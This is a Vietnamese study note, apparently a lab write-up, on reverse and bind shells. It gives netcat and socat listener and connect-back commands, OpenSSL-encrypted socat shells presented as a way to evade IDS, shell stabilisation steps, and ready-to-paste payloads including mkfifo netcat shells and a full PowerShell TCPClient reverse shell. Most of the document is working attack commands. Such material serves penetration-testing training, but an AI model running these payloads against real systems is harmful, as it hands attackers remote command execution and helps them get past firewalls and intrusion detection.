<h1>Shell</h1>

Về cơ bản shell là một giao diện để tương tác với CLI của OS như bash hoặc sh trong Linux, cmd.exe hoặc Powershell trong Windows\
Có 2 dạng shell cơ bản thường được sử dụng trong tấn công,\
reverse shell sử dụng để giúp hacker có quyền access đến command line\
bind shell sử dụng để mỏe port trên server mà hacker có thể kết nối tới\

<h2>Tools</h2>

Một số tool thường được sử dụng để tương tác với shell bao gồm:\
**Netcat\
Socat\
Metasploit --multi/handler\
Msfvenom**

<h2>Types of Shell</h2>

Như đã nói ở trên, 2 loại Shell chính được dùng trong tấn công là: **Reversel Shells** và **Bind Shells**\
>**Reverse Shells** được sử dụng để buộc mục tiêu phải thực hiện kết nối ngược lại về máy của kẻ tấn công. Và trên máy tấn công sẽ sử dụng các tools liệt kê ở mục 2 để lắng nghe các kết nối gọi về.
>Đây là một cách thức sử dụng để bypass firewall rule.\
>**Bind Shells** được sử dụng để mở cổng trên máy mục tiêu và kẻ tấn công sẽ kết nối tới cổng này để thực hiện các hành vi của mình.
>Điểm yếu của shell này là có thể bị tường lửa chặn.

VD về Shell:\
**Reverse Shells**\
Trên máy tấn công:
```console
sudo nc -lvnp 443
```
Trên máy mục tiêu:
```console
nc <Local_IP> <Port> -e /bin/bash
```
![image](https://user-images.githubusercontent.com/95600382/149742730-750f251d-8cbf-4d10-945e-5e84933c86e4.png)\
**Bind Shells**\
Trên máy mục tiêu:
```console
nc -lvnp <port> -e "cmd.exe"
```
Trên máy tấn công:
```console
nc MACHINE_IP <port>
```
![image](https://user-images.githubusercontent.com/95600382/149743149-7f919a1c-81e4-483c-84fe-8e687bdfadc1.png)\
Shell có 2 loại tương tác *interactive* và *non-interactive*:\
Interactive: Shell này sẽ tương tác với các chương trình có trên máy đích sau khi được thực thi. VD:\
![image](https://user-images.githubusercontent.com/95600382/149744064-e33674f7-1a82-4a36-b347-a37ac7dc8cb6.png)\
Non-Interactive: Đơn giản hơn nhưng nó sẽ khó để thực hiện khai thác hơn. VD:\
![image](https://user-images.githubusercontent.com/95600382/149744218-678e2251-a0d6-4a14-b77c-e0cbd8b81b3a.png)\

<h2>Netcat</h2>

Câu lệnh sử dụng netcat để lắng nghe trên Linux:\
*Revesel Shells*
```console
nc -lvnp <port-number>
```
Trong đó:\
-l: set netcat là listener\
-v: verbose\
-n: k sử dụng DNS\
-p: port\
*Bind Shells*
```console
nc <target-ip> <chosen-port>
```
<h2>Netcat Shell Stabilisation</h2>

*C1: Sử dụng Python để tunning Shell*\
Áp dụng cho Linux vì Python gần như luôn được cài đặt mặc định. Có 3 bước để áp dụng:\
1. Sử dụng `python -c 'import pty;pty.spawn("/bin/bash")'` để import thư viện pty và chạy lệnh sau ;
2. `export TERM=xterm` cho phép sử dụng các term command như clear
3. Sử dụng Ctrl + Z để khiến shell chạy ngầm. Quay trở lại giao diện sử dụng `stty raw -echo; fg` để xác thực kết nối lại vào shell
VD:\
![image](https://user-images.githubusercontent.com/95600382/149748187-9e596b74-2f8b-46dc-bbda-f4f47bf98e1e.png)\
*C2: Sử dụng rlwrap*\
Note: rlwrap không được cài đặt mặc định trên Kali. `sudo apt install rlwrap`\
Lệnh sử dụng:
```console
rlwrap nc -lvnp <port>
```
Đây là một kỹ thuật sử dụng tốt cho các Windows Shell.
*C3: Socat*\
Note: Kỹ thuật này chỉ áp dụng cho Linux. Để thực hiện kỹ thuật này trc tiên chúng ta cần up một file `socat static compiled binary` lên mục tiêu.\
Cách dễ nhất là host một server với python:\
```console
sudo python3 -m http.server 80
wget <LOCAL-IP>/socat -O /tmp/socat (hoặc curl)
```
<h2>Socat</h2>

Socat cũng khá tương tự với netcat nhưng về cơ bản thì chúng lại không giống nhau. Một cách hình dung dễ nhất về socat là nó là một connector kết nối 2 điểm với nhau.\
*Reverse Shells*\
Lệnh để lắng nghe reverse shell:
```console
socat TCP-L:<port> -
```
Lệnh sử dụng trong windows để kết nối về:
```console
socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes
```
Tương tự với Linux:
```console
socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"
```
*Bind Shell*\
Ở trên máy mục tiêu sẽ thực hiện lệnh:\
Linux:\
```console
socat TCP-L:<PORT> EXEC:"bash -li"
```
Windows:\
```console
socat TCP-L:<PORT> EXEC:powershell.exe,pipes
```
Trên máy tấn công sẽ thực hiện lệnh để kết nối tới shell:\
```console
socat TCP:<TARGET-IP>:<TARGET-PORT> -
```
Và Socat có thể tạo một kết nối ổn định tới Linux tty Reverse Shell. Lệnh sau sẽ được thực hiện trên máy mục tiêu:\
```console
socat TCP-L:<port> FILE:`tty`,raw,echo=0
```
Trong lệnh trên, ta đang kết nối 2 điểm với nhau port và file. điều này cũng tương tự như sử dụng `Ctrl + Z` và `stty raw -echo; fg` để tạo một kết nối vào tty đầy đủ.\
Việc thực hiện ổn định kết nối với socat này cần phải được kích hoạt với một số lệnh socat trên máy mục tiêu. Thông thường socat không phải là một dịch vụ mặc định nhưng cta vẫn có thể upload một số `precompiled socat binary` để chạy các lệnh socat bình thường.\
Một kịch bản tấn công thường thấy sẽ là, Chạy non-interactive netcat shell trên máy mục tiêu và sử dụng các lệnh socat đặc biệt để chuyển thành interactive shell mà có thể kết nối bằng socat\
Lệnh:\
```console
socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```
EXEC:"bash -li" để tạo một phiên bash\
pty, allocates a pseudoterminal on the target -- part of the stabilisation process\
stderr, makes sure that any error messages get shown in the shell (often a problem with non-interactive shells)\
sigint, passes any Ctrl + C commands through into the sub-process, allowing us to kill commands inside the shell\
setsid, creates the process in a new session\
sane, stabilises the terminal, attempting to "normalise" it.\
![image](https://user-images.githubusercontent.com/95600382/149865352-104db586-5005-44a8-9c88-430abac863cd.png)

<h2>Socat Encryted Shells</h2>

Một trong các chức năng hay của socat là khả năng tạo một encrypted shell (cả 2 loại), thường được sử dụng để   bypass IDS.\
Để tạo một encrypted shell, ta sẽ sử dụng `OPENSSL` thay thế cho `TCP`\
Đầu tiên, ta cần tạo một cert để sử dụng cho encrypted shell:\
```console
openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
```
Lệnh trên sẽ tạo ra một cert với 2048 bit RSA key, self-signed và có hạn 362 ngày. Khi chạy thì sẽ hoàn thiện thông tin về cert, có thể để trống hoặc điền random\
![image](https://user-images.githubusercontent.com/95600382/149866093-b5fa54eb-0746-4896-a531-f3fcc23b1a6b.png)\
Tiếp đó, gộp 2 file `shell.key` và `shell.crt` vào một file `.pem`:
```console
cat shell.key shell.crt > shell.pem
```
![image](https://user-images.githubusercontent.com/95600382/149866369-16faf647-7d47-491e-9be4-17549a2a3923.png)\
Giờ hãy bật reverse shell listener:\
```console
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -
```
Lệnh trên sẽ setup một `OPENSSL listener` sử dụng cert vừa tạo.\
Để kết nối về listener sử dụng lệnh:\
```console
socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash
```
Tương tự với `bind shell`:
Target:\
```console
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes
```
Attacker:\
```console
socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -
```
Lưu ý cert sẽ luôn được sử dụng bởi bên lắng nghe.
VD:\
![image](https://user-images.githubusercontent.com/95600382/149866780-12d87424-4786-418a-a70a-1985f4002de7.png)\
Note: Có thể kết hợp với task socat trước đó.\
Lệnh để setting OPENSSL-LISTENER sử dụng tty:\
```console
socat OPENSSL-LISTEN:53,cert=encrypt.pem,raw,verify=0 FILE:`tty`,raw,echo=0
```
Lệnh để kết nối ngược lại Listener trên:\
```console
socat OPENSLL:10.10.10.5:53,verify=0,EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```

<h2>Common Shell Payloads</h2>

On Linux, however, we would instead use this code to create a listener for a bind shell:\
```console
mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
```
Giải thích:\
The command first creates a named pipe at /tmp/f. It then starts a netcat listener, and connects the input of the listener to the output of the named pipe. The output of the netcat listener (i.e. the commands we send) then gets piped directly into sh, sending the stderr output stream into stdout, and sending stdout itself into the input of the named pipe, thus completing the circle.\
![image](https://user-images.githubusercontent.com/95600382/149868801-73216f4f-dfa5-4e99-bee6-0262b3606abd.png)\
Tương tự với reverse shell:\
```console
mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
```
![image](https://user-images.githubusercontent.com/95600382/149869029-928ef629-2894-40a4-a7e6-32e70b9e9b85.png)\
Với mục tiêu là Windows Server, chúng ta có thể sử dụng Powershell reverse shell, VD:\
```powershell
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
Lệnh trên có thể đc thực hiện thông qua bất kỳ trình thực thi câu lệnh nào trên Windows bao gồm cả web shell.\
![image](https://user-images.githubusercontent.com/95600382/149869257-58518fad-93a1-4c44-b01f-734a763989c4.png)\
Shell code:https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md\





  
